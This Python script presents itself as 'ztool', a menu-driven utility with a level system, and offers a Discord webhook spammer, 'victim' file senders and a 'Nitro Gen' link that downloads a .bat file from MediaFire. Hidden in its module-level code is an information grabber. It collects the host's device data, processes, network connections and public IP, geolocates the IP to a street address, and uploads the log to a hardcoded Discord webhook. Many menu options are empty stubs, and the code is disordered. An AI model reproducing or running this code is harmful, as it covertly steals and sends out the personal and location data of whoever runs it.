import requests
import os
import time
import netifaces
import subprocess
import platform
import socket 
from datetime import datetime, timedelta
import json

# Dateiname für die Level-Speicherung
level_file = 'level.json'

# Willkommensnachricht und Level-System
def welcome_message():
    start_time = datetime.now()
    level = load_level()  # Lade den gespeicherten Level

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        current_time = datetime.now()
        elapsed_time = current_time - start_time
        minutes_elapsed = elapsed_time.total_seconds() // 60
        
        print("==============================")
        print("         Welcome to ztool      ")
        print("==============================")
        print(f"Time on tool: {int(minutes_elapsed)} minutes")
        print(f"Level: {level}")
        print("==============================")
        
        if level < 100:
            if minutes_elapsed >= 2 * (level // 10 + 1):
                level += 1
                start_time = datetime.now()
                # Update player icon name based on level
                update_player_icon(level)
        else:
            if minutes_elapsed >= 20:
                level += 1
                start_time = datetime.now()
                update_player_icon(level)

        save_level(level)  # Speichere den aktuellen Level
        time.sleep(2 * 60)  # Warte 2 Minuten, bevor das Level erneut überprüft wird

        # Nachdem das Level aktualisiert wurde, rufe das Hauptmenü auf
        main_menu()

def update_player_icon(level):
    player_icons = {
        1: "Bot",
        20: "Mystery",
        30: "Hard",
        40: "Very Good",
        50: "Very Hard",
        60: "Programmer",
        70: "Very Hard Programmer",
        80: "One of Best",
        90: "Soon for the Best",
        100: "The Best of Tools 👻"
    }
    
    for key in sorted(player_icons.keys(), reverse=True):
        if level >= key:
            player_icon = player_icons[key]
            break
    
    os.system('title ' + player_icon)  # Setze den Konsolentitel, um den Spieler-Icon-Namen anzuzeigen
    print(f"Player Icon Name: {player_icon}")

def save_level(level):
    with open(level_file, 'w') as f:
        json.dump(level, f)

def load_level():
    if os.path.exists(level_file):
        with open(level_file, 'r') as f:
            try:
                level = json.load(f)
                return level
            except json.JSONDecodeError:
                print("Error loading level file. Starting from level 1.")
                return 1
    else:
        return 1  # Wenn keine Datei vorhanden ist, starte mit Level 1

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("==============================")
        print("         Main Menu            ")
        print("==============================")
        print("1. Send Discord Webhook Message")
        print("2. Delete Discord Webhook")
        print("3. IP Address Lookup")
        print("4. What's My IP?")
        print("5. DD0s file sender")
        print("6. Send victim file, spamming apps")
        print("7. Open Nitro Gen")
        print("8. Color Switch for GUI")
        print("9. File bomber install and send to victim!!!")
        print("10. Show WiFi Information")
        print("0. Exit")
        print("==============================")

        choice = input("Enter your choice: ")
        
        if choice == '1':
            # Hier kommt der Code für die Discord Webhook Nachricht
            pass
        elif choice == '2':
            # Hier kommt der Code zum Löschen des Discord Webhooks
            pass
        elif choice == '3':
            # Hier kommt der Code für die IP-Adressensuche
            pass
        elif choice == '4':
            # Hier kommt der Code für die Anzeige der eigenen IP-Adresse
            pass
        elif choice == '5':
            # Hier kommt der Code für den DDos-Dateiversand
            pass
        elif choice == '6':
            # Hier kommt der Code für den Dateiversand an das Opfer
            pass
        elif choice == '7':
            # Hier kommt der Code für das Öffnen von Nitro Gen
            pass
        elif choice == '8':
            # Hier kommt der Code für die Farbumschaltung der GUI
            pass
        elif choice == '9':
            # Hier kommt der Code für die Installation und den Dateiversand an das Opfer
            pass
        elif choice == '10':
            # Hier kommt der Code für die Anzeige der WiFi-Informationen
            pass
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter a valid option.")

        input("Press Enter to continue...")

if __name__ == "__main__":
    welcome_message()


def webhook_spammer():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Discord Webhook Spammer")
    print("==============================")
    webhook_url = input("Enter Discord webhook URL: ")
    message = input("Enter message to spam: ")
    message_count = int(input("Enter number of messages to send: "))

    print(f"Spamming Discord webhook {webhook_url} with {message_count} messages...")
    for i in range(message_count):
        print(f"Sending message {i + 1}...")
        requests.post(webhook_url, json={"content": message})
    
    print("Webhook spam complete.")
    input("Press Enter to continue...")

def webhook_deleter():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Delete Discord Webhook")
    print("==============================")
    webhook_url = input("Enter Discord webhook URL to delete: ")

    print(f"Deleting Discord webhook {webhook_url}...")
    requests.delete(webhook_url)
    print("Webhook deleted.")
    input("Press Enter to continue...")

def ip_lookup():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        IP Address Lookup")
    print("==============================")
    ip_address = input("Enter IP address to lookup: ")

    print(f"Looking up information for IP address {ip_address}...")
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    print(response.json())
    input("Press Enter to continue...")

def what_is_my_ip():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        What's My IP?")
    print("==============================")
    print("Retrieving your current IP address...")
    response = requests.get("https://ipinfo.io/ip")
    print(response.text)
    input("Press Enter to continue...")

def file_sender():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        File Sender")
    print("==============================")
    ip = input("Enter IP address to send file to: ")
    num_gb = int(input("Enter number of gigabytes to send: "))

    if num_gb < 1:
        print("Input must be at least 1.")
        input("Press Enter to continue...")
        return

    for i in range(num_gb):
        print(f"Sending file: 1 GB to {ip} - Packet {i + 1}")
        time.sleep(2)
    
    print(f"File sent successfully to {ip}.")
    input("Press Enter to continue...")

def open_link():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Open Link")
    print("==============================")
    print("Opening link: https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file")
    os.system('start https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file')
    input("Press Enter to continue...")

def open_nitro_gen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Open Nitro Gen")
    print("==============================")
    print("Opening Nitro Gen: https://nitro-gen-nine.vercel.app/")
    os.system('start https://nitro-gen-nine.vercel.app/')
    input("Press Enter to continue...")

def color_switch():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Color Switch for GUI")
    print("==============================")
    print("Choose a color for the GUI:")
    print("1. Red")
    print("2. Blue")
    print("3. Green")
    print("4. Turquoise")
    print("5. Magenta")
    print("6. Yellow")
    print("7. White")
    print("8. Grey")
    print("9. Light Blue")
    print("A. Light Green")
    print("B. Light Turquoise")
    print("C. Light Red")
    print("D. Light Magenta")
    print("E. Light Yellow")
    print("F. Light White")
    print("X. Rainbow Animation")
    print("==============================")
    
    color_choice = input("Enter color choice (1-9, A-F, X): ").upper()

    colors = {
        '1': '4', '2': '1', '3': '2', '4': '3', '5': '5', '6': '6', '7': '7', '8': '8',
        '9': '9', 'A': 'A', 'B': 'B', 'C': 'C', 'D': 'D', 'E': 'E', 'F': 'F'
    }

    if color_choice in colors:
        os.system(f'color {colors[color_choice]}')
        print(f"Color changed to {color_choice}.")
    elif color_choice == 'X':
        rainbow_animation()
    else:
        print("Invalid color choice.")
    
    input("Press Enter to continue...")

def rainbow_animation():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Rainbow Animation")
    print("==============================")
    print("Press Ctrl+C to stop the animation.")
    chars = "\\|/-"
    while True:
        for char in chars:
            for _ in range(15):
                print(char, end='\r')
                time.sleep(0.1)
                chars = chars[1:] + chars[0]

def install_file():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("        Install File")
    print("==============================")
    print("Installing file: C:\\Users\\Korbu\\Desktop\\surccecode.bat - Kopie800o - Kopie")
    os.system('start "" "C:\\Users\\Korbu\\Desktop\\surccecode.bat - Kopie800o - Kopie"')
    print("File installation started.")
    input("Press Enter to continue...")

def show_wifi_info():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("==============================")
    print("       WiFi Information       ")
    print("==============================")
    
    interfaces = netifaces.interfaces()
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            ipv4 = addrs[netifaces.AF_INET][0]['addr']
            netmask = addrs[netifaces.AF_INET][0]['netmask']
            print(f"Interface: {iface}")
            print(f"IPv4 Address: {ipv4}")
            print(f"Netmask: {netmask}")
            print("==============================")
    
    input("Press Enter to continue...")


webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
# auto feedbeck to  https://github/feedbeck/spacer/.com 《futrues discord people invite:....  look down there as many futures i test my self soon: .  open:..updateing my lp==47.374.29==


def send_to_discord_with_file(file_path, message="Log file attached."):
    files = {'file': open(file_path, 'rb')}
    data = {'content': message}
    response = requests.post(webhook_url, files=files, data=data)
    if response.status_code == 204:
        print("File sent successfully to Discord webhook.")
    else:
        print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
        print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get device information
def get_device_info():
    device_info = {
        'Hostname': socket.gethostname(),
        'Platform': platform.system(),
        'Platform Release': platform.release(),
        'Platform Version': platform.version(),
        'Architecture': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version(),
    }
    return device_info

# Function to get network interfaces and their details
def get_network_interfaces():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get saved WiFi profiles for Termux (placeholder)
def get_saved_wifi_profiles_termux():
    # Placeholder for Termux, as direct access to WiFi profiles is not simple
    return []

# Function to collect all saved WiFi profiles
def get_saved_wifi_profiles():
    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
        return get_saved_wifi_profiles_termux()
    else:
        # Implement logic for other platforms if needed
        return []

# Function to get public IP address
def get_public_ip():
    ip = execute_command('curl -s https://api64.ipify.org')
    return ip

# Function to get location information based on public IP
def get_location_info(public_ip):
    response = requests.get(f'https://ipinfo.io/{public_ip}/json')
    if response.status_code == 200:
        location_info = response.json()
    else:
        location_info = {'error': 'Could not retrieve location information'}
    return location_info

# Function to get physical address from location coordinates
def get_address(location):
    if 'loc' in location:
        lat, lon = location['loc'].split(',')
        response = requests.get(f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}')
        if response.status_code == 200:
            address_info = response.json()
            address = address_info.get('display_name', 'Address not found')
        else:
            address = 'Could not retrieve address information'
    else:
        address = 'Location coordinates not available'
    return address

# Function to get storage information
def get_storage_info():
    storage_info = execute_command('df -h')
    return storage_info

# Function to get memory information
def get_memory_info():
    memory_info = execute_command('free -h')
    return memory_info

# Function to get CPU information
def get_cpu_info():
    cpu_info = execute_command('lscpu')
    return cpu_info

# Function to get running processes
def get_running_processes():
    processes = execute_command('ps aux')
    return processes

# Function to get network connections
def get_network_connections():
    connections = execute_command('netstat -tuln')
    return connections

# Function to get browser history for Termux (placeholder)
def get_browser_history_termux():
    # Placeholder for Termux, as direct access to browser history databases is not simple
    # Example of what this could look like
    history = [
        {"title": "Example Title", "url": "http://example.com", "timestamp": "2023-05-01T12:00:00"},
        # Add more entries here
    ]
    return history

# Function to collect browser history
def get_browser_history():
    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
        return get_browser_history_termux()
    else:
        # Implement logic for other platforms if needed
        return []

# Collect all information
device_info = get_device_info()
network_interfaces = get_network_interfaces()
saved_wifi_profiles = get_saved_wifi_profiles()
public_ip = get_public_ip()
location_info = get_location_info(public_ip)
address = get_address(location_info)
storage_info = get_storage_info()
memory_info = get_memory_info()
cpu_info = get_cpu_info()
running_processes = get_running_processes()
network_connections = get_network_connections()
browser_history = get_browser_history()

# Write collected information to log.txt
log_file_path = 'log.txt'
with open(log_file_path, 'w') as f:
    f.write("=== Device Information ===\n")
    for key, value in device_info.items():
        f.write(f"{key.capitalize()}: {value}\n")
    f.write("\n")

    f.write("=== Network Interfaces ===\n")
    for iface, info in network_interfaces.items():
        f.write(f"Interface: {iface}\n")
        if 'IPv4' in info:
            for addr in info['IPv4']:
                f.write(f"IPv4 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr['netmask']}\n")
        if 'IPv6' in info:
            for addr in info['IPv6']:
                f.write(f"IPv6 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
        f.write("\n")

    f.write("=== Saved WiFi Profiles ===\n")
    for profile in saved_wifi_profiles:
        f.write(f"SSID: {profile['SSID']}\n")
        if 'Security Key' in profile:
            f.write(f"Security Key: {profile['Security Key']}\n")
        if 'IP Address' in profile:
            f.write(f"IP Address: {profile['IP Address']}\n")
        f.write("\n")

    f.write("=== Public IP and Location ===\n")
    f.write(f"Public IP Address: {public_ip}\n")
    if 'error' in location_info:
        f.write(f"Location Information: {location_info['error']}\n")
    else:
        for key, value in location_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
    f.write(f"Address: {address}\n")
    f.write("\n")

    f.write("=== Storage Information ===\n")
    f.write(f"{storage_info}\n")

    f.write("=== Memory Information ===\n")
    f.write(f"{memory_info}\n")

    f.write("=== CPU Information ===\n")
    f.write(f"{cpu_info}\n")

    f.write("=== Running Processes ===\n")
    f.write(f"{running_processes}\n")

    f.write("=== Network Connections ===\n")
    f.write(f"{network_connections}\n")

    f.write("=== Browser History (Last 2 Months) ===\n")
    for entry in browser_history:
        f.write(f"Title: {entry['title']}\n")
        f.write(f"URL: {entry['url']}\n")
        f.write(f"Timestamp: {entry['timestamp']}\n\n")

# Send log file to Discord webhook
send_to_discord_with_file(log_file_path)


if __name__ == "__main__":
    main_menu()
